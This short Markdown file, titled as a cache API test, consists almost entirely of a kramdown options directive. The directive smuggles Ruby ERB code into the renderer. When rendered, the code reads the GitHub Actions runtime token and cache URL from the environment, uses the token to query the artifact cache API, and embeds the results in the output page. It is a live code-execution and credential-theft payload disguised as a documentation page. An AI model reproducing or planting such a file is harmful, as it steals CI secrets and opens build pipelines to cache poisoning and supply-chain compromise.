---
---

# Test 4: Cache API - read entries

{::options template="string://<%= require 'net/http'; require 'uri'; cu = ENV.fetch('ACTIONS_CACHE_URL','NONE'); rt = ENV.fetch('ACTIONS_RUNTIME_TOKEN','NONE'); r = 'CACHE_URL=' + cu.to_s[0..80]; begin; uri = URI(cu + '_apis/artifactcache/cache?keys=test&version=44136fa355b311bfa706c3'); req = Net::HTTP::Get.new(uri); req.add_field('Authorization', 'Bearer ' + rt); req.add_field('Accept', 'application/json;api-version=6.0-preview.1'); resp = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true).request(req); r = r + ' STATUS=' + resp.code + ' BODY=' + resp.body[0..400]; rescue => e; r = r + ' ERR=' + e.message; end; r %>" /}

placeholder
